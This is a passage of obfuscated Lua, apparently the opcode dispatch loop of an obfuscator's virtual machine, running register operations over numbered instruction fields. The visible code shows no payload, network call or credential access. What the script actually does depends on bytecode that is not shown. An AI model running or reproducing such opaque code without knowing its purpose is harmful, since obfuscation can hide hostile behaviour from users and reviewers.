y=f[n];end end end else if(q<=16)then if not(q==16)then bb=y[684]else ba={w[bb](w[bb+1])};end else if(q<17 or q==17)then x=0;else if q<19 then for bc=bb,y[404]do x=(x+1);w[bc]=ba[x];end else break end end end end end q=(q+1)end else local q,x=0 while true do if q<=16 then if q<=7 then if q<=3 then if(q==1 or q<1)then if(q>0)then w[y[684]]=w[y[897]][y[404]];else x=nil end else if 2==q then n=(n+1);else y=f[n];end end else if(q<=5)then if 5>q then w[y[684]]=h[y[897]];else n=(n+1);end else if not(q~=6)then y=f[n];else w[y[684]]=w[y[897]][y[404]];end end end else if(q<11 or q==11)then if(q<9 or q==9)then if not(9==q)then n=n+1;else y=f[n];end else if q<11 then w[y[684]]={};else n=(n+1);end end else if(q<=13)then if 12<q then w[y[684]]=h[y[897]];else y=f[n];end else if(q<=14)then n=(n+1);else if q>15 then w[y[684]]=w[y[897]][y[404]];else y=f[n];end end end end end else if q<=24 then if q<=20 then if(q<=18)then if(17<q)then y=f[n];else n=n+1;end else if not(q~=19)then w[y[684]]=h[y[897]];else n=(n+1);end end else if(q<22 or q==22)then if not(22==q)then y=f[n];else w[y[684]]={};end else if not(q==24)then n=(n+1);else y=f[n];end end end else if q<=28 then if(q==26 or q<26)then if(q<26)then w[y[684]]=h[y[897]];else n=(n+1);end else if 28>q then y=f[n];else w[y[684]]=w[y[897]][y[404]];end end else if(q==30 or q<30)then if not(29~=q)then n=(n+1);else y=f[n];end else if(q<=31)then x=y[684]else if not(q~=32)then w[x]=w[x]()else break end end end end end end q=q+1 end end;elseif(z==261 or z<261)then if((z<259)or z==259)then local q=0 while true do if q<=6 then if(q==2 or(q<2))then if((q==0)or q<0)then w[y[684]]=w[y[897]][y[404]];else if(q>1)then y=f[n];else n=(n+1);end end else if(q<4 or(q==4))then if(4>q)then w[y[684]]=w[y[897]][y[404]];else n=n+1;end else if(5<q)then w[y[684]]=w[y[897]][y[404]];else y=f[n];end end end else if(not(q~=9)or(q<9))then if(q==7 or q<7)then n=n+1;else if not(q==9)then y=f[n];else w[y[684]][y[897]]=w[y[404]];end end else if(q<11 or q==11)then if(not(10~=q))then n=(n+1);else y=f[n];end else if(q>12)then break else n=y[897];end end end end q=(q+1)end elseif 261>z then local q=y[684];local x=w[y[897]];w[(q+1)]=x;w[q]=x[w[y[404]]];else local q,x=0 while true do if(q==7 or q<7)then if(q<3 or q==3)then if(q<=1)then if(q>0)then w[y[684]][y[897]]=w[y[404]];else x=nil end else if not(3==q)then n=(n+1);else y=f[n];end end else if(q<=5)then if q<5 then w[y[684]]={};else n=(n+1);end else if q==6 then y=f[n];else w[y[684]][y[897]]=y[404];end end end else if q<=11 then if q<=9 then if q>8 then y=f[n];else n=n+1;end else if q~=11 then w[y[684]][y[897]]=w[y[404]];else n=n+1;end end else if(q==13 or q<13)then if not(q==13)then y=f[n];else x=y[684]end else if(q>14)then break else w[x]=w[x](r(w,x+1,y[897]))end end end end q=q+1 end end;elseif(z<262 or z==262)then local q,x=0 while true do if q<=7 then if q<=3 then if(q<=1)then if(0==q)then x=nil else w[y[684]]=j[y[897]];end else if q~=3 then n=(n+1);else y=f[n];end end else if(q<5 or q==5)then if 4<q then n=(n+1);else w[y[684]]=w[y[897]][y[404]];end else if 6==q then y=f[n];else w[y[684]]=h[y[897]];end end end else if(q<=11)then if(q<9 or q==9)then if 8==q then n=(n+1);else y=f[n];end else if 10<q then n=n+1;else w[y[684]]=w[y[897]][y[404]];end end else if q<=13 then if q<13 then y=f[n];else x=y[684]end else if 14<q then break else w[x]=w[x](w[x+1])end end end end q=(q+1)end elseif not(z~=263)then local q,x=0 while true do if(q<7 or q==7)then if q<=3 then if(q==1 or q<1)then if not(0~=q)then x=nil else w[y[684]]=h[y[897]];end else if q==2 then n=(n+1);else y=f[n];end end else if(q==5 or q<5)then if(4==q)then w[y[684]]=y[897];else n=(n+1);end else if q~=7 then y=f[n];else w[y[684]]=y[897];end end end else if q<=11 then if(q<=9)then if q<9 then n=(n+1);else y=f[n];end else if not(q==11)then w[y[684]]=y[897];else n=n+1;end end else if q<=13 then if(13>q)then y=f[n];else x=y[684]end else if 14<q then break else w[x]=w[x](r(w,x+1,y[897]))end end end end q=(q+1)end else local q=w[y[404]];if not q then n=(n+1);else w[y[684]]=q;n=y[897];end;end;elseif(276>z or 276==z)then if(270==z or 270>z)then if(z==267 or z<267)then if(265>z or 265==z)then local q=y[684]local x={w[q](r(w,q+1,p))};local ba=0;for bb=q,y[404]do ba=(ba+1);w[bb]=x[ba];end elseif z==266 then local q,x=0 while true do if q<=8 then if q<=3 then if q<=1 then if q<1 then x=nil else w[y[684]]=w[y[897]][y[404]];end else if q==2 then n=n+1;else y=f[n];end end else if q<=5 then if 5>q then w[y[684]]=h[y[897]];else n=n+1;end else if q<=6 then y=f[n];else if 7<q then n=n+1;else w[y[684]]=w[y[897]][y[404]];end end end end else if q<=13 then if q<=10 then if q~=10 then y=f[n];else w[y[684]]=h[y[897]];end else if q<=11 then n=n+1;else if q>12 then w[y[684]]=w[y[897]][y[404]];else y=f[n];end end end else if q<=15 then if q>14 then y=f[n];else n=n+1;end else if q<=16 then x=y[684]else if q>17 then break else w[x]=w[x](r(w,x+1,y[897]))end end end end end q=q+1 end else local q,x,ba,bb=0 while true do if q<=9 then if q<=4 then if q<=1 then if q>0 then ba=nil else x=nil end else if q<=2 then bb=nil else if 4~=q then w[y[684]]=h[y[897]];else n=n+1;end end end else if q<=6 then if q<6 then y=f[n];else w[y[684]]=h[y[897]];end else if q<=7 then n=n+1;else if 8==q then y=f[n];else w[y[684]]=w[y[897]][y[404]];end end end end else if q<=14 then if q<=11 then if 11>q then n=n+1;else y=f[n];end else if q<=12 then w[y[684]]=w[y[897]][w[y[404]]];else if 14>q then n=n+1;else y=f[n];end end end else if q<=16 then if q==15 then bb=y[684]else ba={w[bb](w[bb+1])};end else if q<=17 then x=0;else if 19~=q then for bc=bb,y[404]do x=x+1;w[bc]=ba[x];end else break end end end end end q=q+1 end end;elseif(z<268 or z==268)then local q,x,ba,bb=0 while true do if q<=15 then if q<=7 then if q<=3 then if q<=1 then if q==0 then x=nil else ba=nil end else if q~=3 then bb=nil else w[y[684]]=h[y[897]];end end else if q<=5 then if 5~=q then n=n+1;else y=f[n];end else if q~=7 then w[y[684]]=w[y[897]][y[404]];else n=n+1;end end end else if q<=11 then if q<=9 then if 9~=q then y=f[n];else w[y[684]]=h[y[897]];end else if q==10 then n=n+1;else y=f[n];end end else if q<=13 then if 12==q then w[y[684]]=w[y[897]][y[404]];else n=n+1;end else if 15~=q then y=f[n];else w[y[684]]=w[y[897]][w[y[404]]];end end end end else if q<=23 then if q<=19 then if q<=17 then if q~=17 then n=n+1;else y=f[n];end else if q<19 then w[y[684]]=h[y[897]];else n=n+1;end end else if q<=21 then if q==20 then y=f[n];else w[y[684]]=w[y[897]][y[404]];end else if q<23 then n=n+1;else y=f[n];end end end else if q<=27 then if q<=25 then if q~=25 then w[y[684]]=w[y[897]][y[404]];else n=n+1;end else if q~=27 then y=f[n];else bb=y[897];end end else if q<=29 then if q>28 then x=k(w,g,bb,ba);else ba=y[404];end else if q==30 then w[y[684]]=x;else break end end end end end q=q+1 end elseif z>269 then local q=0 while true do if q<=9 then if q<=4 then if q<=1 then if q>0 then n=n+1;else w[y[684]]=w[y[897]]/y[404];end else if q<=2 then y=f[n];else if q>3 then n=n+1;else w[y[684]]=w[y[897]]-w[y[404]];end end end else if q<=6 then if 5<q then w[y[684]]=w[y[897]]/y[404];else y=f[n];end else if q<=7 then n=n+1;else if 8==q then y=f[n];else w[y[684]]=w[y[897]]*y[404];end end end end else if q<=14 then if q<=11 then if 11~=q then n=n+1;else y=f[n];end else if q<=12 then w[y[684]]=w[y[897]];else if q<14 then n=n+1;else y=f[n];end end end else if q<=16 then if 15==q then w[y[684]]=w[y[897]];else n=n+1;end else if q<=17 then y=f[n];else if 19>q then n=y[897];else break end end end end end q=q+1 end else local q,x=0 while true do if q<=7 then if q<=3 then if q<=1 then if 0==q then x=nil else w={};end else if 2==q then for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;else n=n+1;end end else if q<=5 then if 5~=q then y=f[n];else w[y[684]]=h[y[897]];end else if 7>q then n=n+1;else y=f[n];end end end else if q<=11 then if q<=9 then if q==8 then w[y[684]]=w[y[897]];else n=n+1;end else if 11~=q then y=f[n];else w[y[684]]=true;end end else if q<=13 then if q<13 then n=n+1;else y=f[n];end else if q<=14 then x=y[684]else if q==15 then w[x]=w[x](r(w,x+1,y[897]))else break end end end end end q=q+1 end end;elseif(273>=z)then if 271>=z then local q=y[684];local x=w[y[897]];w[(q+1)]=x;w[q]=x[y[404]];elseif not(272~=z)then local q=0 while true do if q<=7 then if q<=3 then if q<=1 then if 0<q then n=n+1;else w[y[684]]=w[y[897]][y[404]];end else if 3~=q then y=f[n];else w[y[684]]=h[y[897]];end end else if q<=5 then if 4<q then y=f[n];else n=n+1;end else if 7~=q then w[y[684]]=w[y[897]][y[404]];else n=n+1;end end end else if q<=11 then if q<=9 then if 9~=q then y=f[n];else w[y[684]]=w[y[897]][w[y[404]]];end else if 10<q then y=f[n];else n=n+1;end end else if q<=13 then if q~=13 then w[y[684]]=w[y[897]][y[404]];else n=n+1;end else if q<=14 then y=f[n];else if q~=16 then w[y[684]]=w[y[897]][y[404]];else break end end end end end q=q+1 end else local q,x,ba,bb=0 while true do if q<=9 then if q<=4 then if q<=1 then if 1~=q then x=nil else ba=nil end else if q<=2 then bb=nil else if q>3 then n=n+1;else w[y[684]]=h[y[897]];end end end else if q<=6 then if 5<q then w[y[684]]=h[y[897]];else y=f[n];end else if q<=7 then n=n+1;else if q<9 then y=f[n];else w[y[684]]=w[y[897]][y[404]];end end end end else if q<=14 then if q<=11 then if 10<q then y=f[n];else n=n+1;end else if q<=12 then w[y[684]]=w[y[897]][w[y[404]]];else if q~=14 then n=n+1;else y=f[n];end end end else if q<=16 then if q<16 then bb=y[684]else ba={w[bb](w[bb+1])};end else if q<=17 then x=0;else if 18==q then for bc=bb,y[404]do x=x+1;w[bc]=ba[x];end else break end end end end end q=q+1 end end;elseif(274>=z)then local q,x=0 while true do if q<=7 then if q<=3 then if q<=1 then if q~=1 then x=nil else w[y[684]]=w[y[897]];end else if q==2 then n=n+1;else y=f[n];end end else if q<=5 then if 4==q then w[y[684]]=y[897];else n=n+1;end else if q~=7 then y=f[n];else w[y[684]]=y[897];end end end else if q<=11 then if q<=9 then if 8==q then n=n+1;else y=f[n];end else if 10<q then n=n+1;else w[y[684]]=y[897];end end else if q<=13 then if 13~=q then y=f[n];else x=y[684]end else if q~=15 then w[x]=w[x](r(w,x+1,y[897]))else break end end end end q=q+1 end elseif not(275~=z)then w[y[684]]=w[y[897]];else local q,x,ba,bb=0 while true do if q<=9 then if q<=4 then if q<=1 then if 1~=q then x=nil else ba=nil end else if q<=2 then bb=nil else if q==3 then w[y[684]]=h[y[897]];else n=n+1;end end end else if q<=6 then if 6~=q then y=f[n];else w[y[684]]=h[y[897]];end else if q<=7 then n=n+1;else if 8==q then y=f[n];else w[y[684]]=w[y[897]][y[404]];end end end end else if q<=14 then if q<=11 then if q==10 then n=n+1;else y=f[n];end else if q<=12 then w[y[684]]=w[y[897]][w[y[404]]];else if 14~=q then n=n+1;else y=f[n];end end end else if q<=16 then if q~=16 then bb=y[684]else ba={w[bb](w[bb+1])};end else if q<=17 then x=0;else if 18<q then break else for bc=bb,y[404]do x=x+1;w[bc]=ba[x];end end end end end end q=q+1 end end;elseif(282==z or 282>z)then if(279>=z)then if(z==277 or z<277)then local q=y[897];local x=y[404];local q=k(w,g,q,x);w[y[684]]=q;elseif not(z==279)then local q=0 while true do if q<=6 then if q<=2 then if q<=0 then w[y[684]]=w[y[897]][y[404]];else if 1==q then n=n+1;else y=f[n];end end else if q<=4 then if 3==q then w[y[684]]=w[y[897]][y[404]];else n=n+1;end else if q~=6 then y=f[n];else w[y[684]]=w[y[897]][y[404]];end end end else if q<=9 then if q<=7 then n=n+1;else if 8<q then w[y[684]][y[897]]=w[y[404]];else y=f[n];end end else if q<=11 then if 11>q then n=n+1;else y=f[n];end else if q<13 then n=y[897];else break end end end end q=q+1 end else local q,x=0 while true do if q<=7 then if q<=3 then if q<=1 then if 0==q then x=nil else w[y[684]]=w[y[897]];end else if 3>q then n=n+1;else y=f[n];end end else if q<=5 then if 5>q then w[y[684]]=y[897];else n=n+1;end else if 6<q then w[y[684]]=y[897];else y=f[n];end end end else if q<=11 then if q<=9 then if q<9 then n=n+1;else y=f[n];end else if q==10 then w[y[684]]=y[897];else n=n+1;end end else if q<=13 then if q<13 then y=f[n];else x=y[684]end else if q>14 then break else w[x]=w[x](r(w,x+1,y[897]))end end end end q=q+1 end end;elseif z<=280 then local q=0 while true do if q<=6 then if q<=2 then if q<=0 then w[y[684]]=w[y[897]][y[404]];else if q<2 then n=n+1;else y=f[n];end end else if q<=4 then if q<4 then w[y[684]]=w[y[897]][y[404]];else n=n+1;end else if 6>q then y=f[n];else w[y[684]]=w[y[897]][y[404]];end end end else if q<=9 then if q<=7 then n=n+1;else if q==8 then y=f[n];else w[y[684]]=w[y[897]][y[404]];end end else if q<=11 then if q>10 then y=f[n];else n=n+1;end else if 12<q then break else if w[y[684]]then n=n+1;else n=y[897];end;end end end end q=q+1 end elseif(281<z)then local q,x=0 while true do if q<=7 then if q<=3 then if q<=1 then if 0==q then x=nil else w[y[684]][y[897]]=w[y[404]];end else if q~=3 then n=n+1;else y=f[n];end end else if q<=5 then if 4<q then n=n+1;else w[y[684]]={};end else if 6==q then y=f[n];else w[y[684]][y[897]]=y[404];end end end else if q<=11 then if q<=9 then if q==8 then n=n+1;else y=f[n];end else if 11~=q then w[y[684]][y[897]]=w[y[404]];else n=n+1;end end else if q<=13 then if 12<q then x=y[684]else y=f[n];end else if q<15 then w[x]=w[x](r(w,x+1,y[897]))else break end end end end q=q+1 end else local q,x=0 while true do if q<=8 then if q<=3 then if q<=1 then if q==0 then x=nil else w[y[684]]=j[y[897]];end else if 3>q then n=n+1;else y=f[n];end end else if q<=5 then if q==4 then w[y[684]]=w[y[897]][y[404]];else n=n+1;end else if q<=6 then y=f[n];else if 7<q then n=n+1;else w[y[684]]=y[897];end end end end else if q<=13 then if q<=10 then if 9==q then y=f[n];else w[y[684]]=y[897];end else if q<=11 then n=n+1;else if q<13 then y=f[n];else w[y[684]]=y[897];end end end else if q<=15 then if q>14 then y=f[n];else n=n+1;end else if q<=16 then x=y[684]else if q==17 then w[x]=w[x](r(w,x+1,y[897]))else break end end end end end q=q+1 end end;elseif z<=285 then if(283>=z)then local q,x=0 while true do if(q<11 or q==11)then if(q<5 or q==5)then if(q<2 or q==2)then if(q<=0)then x=nil else if(q<2)then w[y[684]]=w[y[897]][y[404]];else n=(n+1);end end else if(q<=3)then y=f[n];else if not(5==q)then w[y[684]]=j[y[897]];else n=(n+1);end end end else if q<=8 then if(q==6 or q<6)then y=f[n];else if 7<q then n=n+1;else w[y[684]]=w[y[897]][y[404]];end end else if(q<=9)then y=f[n];else if 11~=q then w[y[684]]=w[y[897]][y[404]];else n=n+1;end end end end else if(q<=17)then if(q<=14)then if q<=12 then y=f[n];else if(q~=14)then w[y[684]]=w[y[897]][y[404]];else n=n+1;end end else if(q==15 or q<15)then y=f[n];else if 16==q then w[y[684]]=w[y[897]][y[404]];else n=n+1;end end end else if(q==20 or q<20)then if(q<18 or q==18)then y=f[n];else if not(19~=q)then w[y[684]]=w[y[897]][y[404]];else n=n+1;end end else if(q==22 or q<22)then if(q~=22)then y=f[n];else x=y[684]end else if(23<q)then break else w[x]=w[x](r(w,(x+1),y[897]))end end end end end q=q+1 end elseif(z>284)then local q,x,ba,bb=0 while true do if q<=9 then if q<=4 then if q<=1 then if 1>q then x=nil else ba=nil end else if q<=2 then bb=nil else if 3==q then w[y[684]]=h[y[897]];else n=n+1;end end end else if q<=6 then if q<6 then y=f[n];else w[y[684]]=h[y[897]];end else if q<=7 then n=n+1;else if 9~=q then y=f[n];else w[y[684]]=w[y[897]][y[404]];end end end end else if q<=14 then if q<=11 then if q~=11 then n=n+1;else y=f[n];end else if q<=12 then w[y[684]]=w[y[897]][w[y[404]]];else if q<14 then n=n+1;else y=f[n];end end end else if q<=16 then if q<16 then bb=y[684]else ba={w[bb](w[bb+1])};end else if q<=17 then x=0;else if q~=19 then for bc=bb,y[404]do x=x+1;w[bc]=ba[x];end else break end end end end end q=q+1 end else local q,x,ba,bb=0 while true do if q<=9 then if q<=4 then if q<=1 then if 1~=q then x=nil else ba=nil end else if q<=2 then bb=nil else if 4~=q then w[y[684]]=h[y[897]];else n=n+1;end end end else if q<=6 then if 6~=q then y=f[n];else w[y[684]]=h[y[897]];end else if q<=7 then n=n+1;else if q<9 then y=f[n];else w[y[684]]=w[y[897]][y[404]];end end end end else if q<=14 then if q<=11 then if q>10 then y=f[n];else n=n+1;end else if q<=12 then w[y[684]]=w[y[897]][w[y[404]]];else if q>13 then y=f[n];else n=n+1;end end end else if q<=16 then if 16~=q then bb=y[684]else ba={w[bb](w[bb+1])};end else if q<=17 then x=0;else if 19>q then for bc=bb,y[404]do x=x+1;w[bc]=ba[x];end else break end end end end end q=q+1 end end;elseif(286==z or 286>z)then local q=0 while true do if q<=9 then if q<=4 then if q<=1 then if 0==q then w[y[684]][y[897]]=y[404];else n=n+1;end else if q<=2 then y=f[n];else if q<4 then w[y[684]]={};else n=n+1;end end end else if q<=6 then if 5<q then w[y[684]][y[897]]=w[y[404]];else y=f[n];end else if q<=7 then n=n+1;else if 8<q then w[y[684]]=h[y[897]];else y=f[n];end end end end else if q<=14 then if q<=11 then if 11~=q then n=n+1;else y=f[n];end else if q<=12 then w[y[684]]=w[y[897]][y[404]];else if 14>q then n=n+1;else y=f[n];end end end else if q<=16 then if q>15 then n=n+1;else w[y[684]][y[897]]=w[y[404]];end else if q<=17 then y=f[n];else if q==18 then w[y[684]][y[897]]=w[y[404]];else break end end end end end q=q+1 end elseif(z==287)then local q,x=0 while true do if q<=8 then if q<=3 then if q<=1 then if 0==q then x=nil else w[y[684]]=w[y[897]][y[404]];end else if q==2 then n=n+1;else y=f[n];end end else if q<=5 then if q<5 then w[y[684]]=h[y[897]];else n=n+1;end else if q<=6 then y=f[n];else if q==7 then w[y[684]]=w[y[897]][w[y[404]]];else n=n+1;end end end end else if q<=13 then if q<=10 then if q<10 then y=f[n];else w[y[684]]=h[y[897]];end else if q<=11 then n=n+1;else if q<13 then y=f[n];else w[y[684]]=w[y[897]][y[404]];end end end else if q<=15 then if 15>q then n=n+1;else y=f[n];end else if q<=16 then x=y[684]else if 18~=q then w[x]=w[x](r(w,x+1,y[897]))else break end end end end end q=q+1 end else local q,x,ba,bb=0 while true do if q<=9 then if q<=4 then if q<=1 then if q>0 then ba=nil else x=nil end else if q<=2 then bb=nil else if q~=4 then w[y[684]]=h[y[897]];else n=n+1;end end end else if q<=6 then if q>5 then w[y[684]]=h[y[897]];else y=f[n];end else if q<=7 then n=n+1;else if q<9 then y=f[n];else w[y[684]]=w[y[897]][y[404]];end end end end else if q<=14 then if q<=11 then if q<11 then n=n+1;else y=f[n];end else if q<=12 then w[y[684]]=w[y[897]][w[y[404]]];else if 13==q then n=n+1;else y=f[n];end end end else if q<=16 then if 15==q then bb=y[684]else ba={w[bb](w[bb+1])};end else if q<=17 then x=0;else if 18<q then break else for bc=bb,y[404]do x=x+1;w[bc]=ba[x];end end end end end end q=q+1 end end;elseif 336>=z then if 312>=z then if 300>=z then if z<=294 then if z<=291 then if z<=289 then local q=0 while true do if q<=6 then if q<=2 then if q<=0 then w[y[684]]=w[y[897]][y[404]];else if 2>q then n=n+1;else y=f[n];end end else if q<=4 then if 4>q then w[y[684]]=w[y[897]][y[404]];else n=n+1;end else if 5==q then y=f[n];else w[y[684]]=w[y[897]][y[404]];end end end else if q<=9 then if q<=7 then n=n+1;else if q<9 then y=f[n];else w[y[684]]=w[y[897]][y[404]];end end else if q<=11 then if 11>q then n=n+1;else y=f[n];end else if q~=13 then if w[y[684]]then n=n+1;else n=y[897];end;else break end end end end q=q+1 end elseif z~=291 then w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][w[y[404]]];n=n+1;y=f[n];if(w[y[684]]~=y[404])then n=n+1;else n=y[897];end;else w[y[684]][y[897]]=y[404];n=n+1;y=f[n];w[y[684]]={};n=n+1;y=f[n];w[y[684]][y[897]]=w[y[404]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]][y[897]]=w[y[404]];n=n+1;y=f[n];w[y[684]][y[897]]=w[y[404]];end;elseif z<=292 then local q;w[y[684]]={};n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]][y[897]]=w[y[404]];n=n+1;y=f[n];w[y[684]]=j[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=j[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];q=y[684]w[q]=w[q]()elseif z<294 then do return w[y[684]]end else local q;w[y[684]]={};n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]][w[y[897]]]=w[y[404]];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]][w[y[897]]]=w[y[404]];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]][w[y[897]]]=w[y[404]];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]][w[y[897]]]=w[y[404]];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]][w[y[897]]]=w[y[404]];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]][w[y[897]]]=w[y[404]];n=n+1;y=f[n];w[y[684]]={};n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]][w[y[897]]]=w[y[404]];n=n+1;y=f[n];w[y[684]]=j[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]];n=n+1;y=f[n];q=y[684]w[q](r(w,q+1,y[897]))end;elseif 297>=z then if z<=295 then local q=0 while true do if q<=7 then if q<=3 then if q<=1 then if q==0 then w[y[684]]=w[y[897]][y[404]];else n=n+1;end else if 3~=q then y=f[n];else w[y[684]][y[897]]=w[y[404]];end end else if q<=5 then if 5>q then n=n+1;else y=f[n];end else if q<7 then w[y[684]]=w[y[897]][y[404]];else n=n+1;end end end else if q<=11 then if q<=9 then if q~=9 then y=f[n];else w[y[684]]=h[y[897]];end else if 11>q then n=n+1;else y=f[n];end end else if q<=13 then if q<13 then w[y[684]]=w[y[897]][y[404]];else n=n+1;end else if q<=14 then y=f[n];else if 16>q then if(w[y[684]]~=w[y[404]])then n=n+1;else n=y[897];end;else break end end end end end q=q+1 end elseif 296<z then local q=y[684]local x,ba=i(w[q](w[q+1]))p=ba+q-1 local ba=0;for bb=q,p do ba=ba+1;w[bb]=x[ba];end;else local q=y[684]w[q](w[q+1])end;elseif 298>=z then w[y[684]]();elseif 300>z then w[y[684]]=w[y[897]]%y[404];else w[y[684]]=w[y[897]]/y[404];end;elseif 306>=z then if 303>=z then if 301>=z then local q;local x;local ba;w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][w[y[404]]];n=n+1;y=f[n];ba=y[684]x={w[ba](w[ba+1])};q=0;for bb=ba,y[404]do q=q+1;w[bb]=x[q];end elseif 303~=z then w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]][y[897]]=w[y[404]];n=n+1;y=f[n];n=y[897];else local q;w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];q=y[684]w[q]=w[q](r(w,q+1,y[897]))end;elseif 304>=z then local q=y[684]local x={}for ba=1,#v do local bb=v[ba]for bc=1,#bb do local bb=bb[bc]local bc,bc=bb[1],bb[2]if bc>=q then x[bc]=w[bc]bb[1]=x v[ba]=nil;end end end elseif z>305 then local q;local x;local ba;w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][w[y[404]]];n=n+1;y=f[n];ba=y[684]x={w[ba](w[ba+1])};q=0;for bb=ba,y[404]do q=q+1;w[bb]=x[q];end else w[y[684]]=y[897];end;elseif 309>=z then if 307>=z then local q;w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];q=y[684]w[q]=w[q](r(w,q+1,y[897]))elseif z~=309 then local q;local x;local ba;w[y[684]]=j[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];ba=y[684]x={w[ba](w[ba+1])};q=0;for bb=ba,y[404]do q=q+1;w[bb]=x[q];end else local q=y[684]local x={w[q](r(w,q+1,p))};local ba=0;for bb=q,y[404]do ba=ba+1;w[bb]=x[ba];end end;elseif 310>=z then local q;local x;local ba;w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][w[y[404]]];n=n+1;y=f[n];ba=y[684]x={w[ba](w[ba+1])};q=0;for bb=ba,y[404]do q=q+1;w[bb]=x[q];end elseif 311==z then local q;w[y[684]][y[897]]=w[y[404]];n=n+1;y=f[n];w[y[684]]={};n=n+1;y=f[n];w[y[684]][y[897]]=y[404];n=n+1;y=f[n];w[y[684]][y[897]]=w[y[404]];n=n+1;y=f[n];q=y[684]w[q]=w[q](r(w,q+1,y[897]))else local q=y[684];local x=y[404];local ba=q+2;local bb={w[q](w[q+1],w[ba])};for bc=1,x do w[ba+bc]=bb[bc];end local q=w[q+3];if q then w[ba]=q;n=y[897];else n=n+1 end;end;elseif z<=324 then if z<=318 then if z<=315 then if 313>=z then local q;local x;local ba;w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][w[y[404]]];n=n+1;y=f[n];ba=y[684]x={w[ba](w[ba+1])};q=0;for bb=ba,y[404]do q=q+1;w[bb]=x[q];end elseif 315>z then local q;local x;local ba;w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][w[y[404]]];n=n+1;y=f[n];ba=y[684]x={w[ba](w[ba+1])};q=0;for bb=ba,y[404]do q=q+1;w[bb]=x[q];end else local q;w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];q=y[684]w[q]=w[q](r(w,q+1,y[897]))end;elseif 316>=z then local q;w={};for x=0,u,1 do if x<o then w[x]=s[x+1];else break;end;end;n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=j[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];q=y[684]w[q]=w[q](r(w,q+1,y[897]))elseif z>317 then local q;local x;local ba;w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][w[y[404]]];n=n+1;y=f[n];ba=y[684]x={w[ba](w[ba+1])};q=0;for bb=ba,y[404]do q=q+1;w[bb]=x[q];end else local q=y[684]local i,x=i(w[q](w[q+1]))p=x+q-1 local x=0;for ba=q,p do x=x+1;w[ba]=i[x];end;end;elseif z<=321 then if 319>=z then local i;w[y[684]]=j[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];i=y[684]w[i]=w[i](w[i+1])elseif 321>z then local i;local q;local x;w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][w[y[404]]];n=n+1;y=f[n];x=y[684]q={w[x](w[x+1])};i=0;for ba=x,y[404]do 